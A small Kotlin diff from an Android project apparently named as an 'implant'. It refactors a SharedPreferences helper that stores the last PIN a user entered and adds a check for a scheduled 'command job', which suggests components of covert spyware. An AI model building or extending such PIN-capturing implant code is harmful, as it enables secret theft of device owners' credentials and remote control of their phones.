@@ -6,6 +6,9 @@ import com.cooperthecoder.implant.Config
 
 
 object SharedPreferencesQuery {
+    const val PREFS_KEY_LAST_PIN = "last_pin"
+    const val PREFS_KEY_JOB_SCHEDULED = "job_id"
+
     private fun reader(context: Context): SharedPreferences {
         val appContext = context.applicationContext
         val prefs = appContext.getSharedPreferences(
@@ -20,13 +23,18 @@ object SharedPreferencesQuery {
     }
 
     fun addLastPinEntered(context: Context, pin: String): Boolean {
-        val added = writer(context).putString(Config.PREFS_KEY_LAST_PIN, pin)
+        val added = writer(context).putString(PREFS_KEY_LAST_PIN, pin)
                 .commit()
         return added
     }
 
     fun getNextPin(context: Context): String? {
-        val nextPin = reader(context).getString(Config.PREFS_KEY_LAST_PIN, null)
+        val nextPin = reader(context).getString(PREFS_KEY_LAST_PIN, null)
         return nextPin
+    }
+
+    fun commandJobIsScheduled(context: Context): Boolean {
+        val jobId = reader(context).getString(PREFS_KEY_JOB_SCHEDULED, null)
+        return jobId != null
     }
 }
